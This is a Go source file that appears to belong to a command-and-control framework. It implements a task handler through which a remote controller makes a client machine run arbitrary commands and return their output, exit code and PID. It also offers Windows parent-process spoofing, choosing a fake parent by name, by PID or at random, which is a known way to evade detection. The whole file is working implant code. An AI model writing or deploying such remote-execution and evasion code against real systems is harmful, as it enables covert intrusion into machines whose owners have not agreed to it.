package task

import (
	"bytes"
	"context"
	"io"
	"time"

	"github.com/iDigitalFlame/xmt/cmd"

	"github.com/iDigitalFlame/xmt/com"
	"github.com/iDigitalFlame/xmt/data"
)

// TaskExecute is a Task that instructs the Client to run the supplied command and return the output
// if the 'Wait' flag is true.
const TaskExecute simpleTask = 0xB005

// Process is a struct that is similar to the 'cmd.Process' struct. This is used to Task a Client with running
// a specified command.
type Process struct {
	Dir     string
	Env     []string
	Wait    bool
	Args    []string
	Stdin   []byte
	Flags   uint32
	Timeout time.Duration

	pPID     int32
	pName    string
	pChoices []string
}

// SetFlags will set the startup Flag values used for Windows programs. This function overrites many
// of the 'Set*' functions. Has no effect if the device is not running Windows.
func (p *Process) SetFlags(f uint32) error {
	p.Flags = f
	return nil
}

// SetParent will instruct the Process to choose a parent with the supplied process name. If this string is empty,
// this will use the current process (default). Has no effect if the device is not running Windows.
func (p *Process) SetParent(n string) error {
	p.pName = n
	return nil
}

// SetParentPID will instruct the Process to choose a parent with the supplied process ID. If this number is
// zero, this will use the current process (default) and if < 0 this Process will choose a parent from a list
// of writable processes.
func (p *Process) SetParentPID(i int32) error {
	p.pPID = i
	return nil
}

// SetParentRandom will set instruct the Process to choose a parent from the supplied string list on runtime. If this
// list is empty or nil, there is no limit to the name of the chosen process. Has no effect if the device is not
// running Windows.
func (p *Process) SetParentRandom(c []string) error {
	p.pChoices = c
	return nil
}

// MarshalStream writes the data for this Process to the supplied Writer.
func (p Process) MarshalStream(w data.Writer) error {
	if err := data.WriteStringList(w, p.Args); err != nil {
		return err
	}
	if err := w.WriteString(p.Dir); err != nil {
		return err
	}
	if err := data.WriteStringList(w, p.Env); err != nil {
		return err
	}
	if err := w.WriteBool(p.Wait); err != nil {
		return err
	}
	if err := w.WriteUint32(p.Flags); err != nil {
		return err
	}
	if err := w.WriteUint64(uint64(p.Timeout)); err != nil {
		return err
	}
	if err := w.WriteInt32(p.pPID); err != nil {
		return err
	}
	if err := w.WriteString(p.pName); err != nil {
		return err
	}
	if err := data.WriteStringList(w, p.pChoices); err != nil {
		return err
	}
	if err := w.WriteBytes(p.Stdin); err != nil {
		return err
	}
	return nil
}

// UnmarshalStream reads the data for this Process from the supplied Reader.
func (p *Process) UnmarshalStream(r data.Reader) error {
	if err := data.ReadStringList(r, &p.Args); err != nil {
		return err
	}
	if err := r.ReadString(&p.Dir); err != nil {
		return err
	}
	if err := data.ReadStringList(r, &p.Env); err != nil {
		return err
	}
	if err := r.ReadBool(&p.Wait); err != nil {
		return err
	}
	if err := r.ReadUint32(&p.Flags); err != nil {
		return err
	}
	t, err := r.Uint64()
	if err != nil {
		return err
	}
	p.Timeout = time.Duration(t)
	if err = r.ReadInt32(&p.pPID); err != nil {
		return err
	}
	if err = r.ReadString(&p.pName); err != nil {
		return err
	}
	if err = data.ReadStringList(r, &p.pChoices); err != nil {
		return err
	}
	if p.Stdin, err = r.Bytes(); err != nil {
		return err
	}
	return nil
}
func (p Process) convert(x context.Context) *cmd.Process {
	e := cmd.NewProcessContext(x, p.Args...)
	e.Timeout = p.Timeout
	e.Dir, e.Env = p.Dir, p.Env
	e.SetFlags(p.Flags)
	switch {
	case p.pPID != 0:
		e.SetParentPID(p.pPID)
	case len(p.pName) > 0:
		e.SetParent(p.pName)
	case len(p.pChoices) > 0:
		e.SetParentRandom(p.pChoices)
	}
	if len(p.Stdin) > 0 {
		e.Stdin = bytes.NewReader(p.Stdin)
	}
	return e
}
func taskProcess(x context.Context, p *com.Packet) (*com.Packet, error) {
	var e Process
	if err := e.UnmarshalStream(p); err != nil {
		return nil, err
	}
	var (
		z   = e.convert(x)
		o   bytes.Buffer
		err error
	)
	if e.Wait {
		z.Stdout = &o
		z.Stderr = &o
	}
	if err = z.Start(); err != nil {
		return nil, err
	}
	w := new(com.Packet)
	if w.WriteUint64(z.Pid()); !e.Wait {
		w.WriteInt32(0)
		return w, nil
	}
	err = z.Wait()
	if _, ok := err.(*cmd.ExitError); !ok {
		w.Clear()
		return nil, err
	}
	c, _ := z.ExitCode()
	w.WriteInt32(c)
	io.Copy(w, &o)
	w.Close()
	return w, nil
}
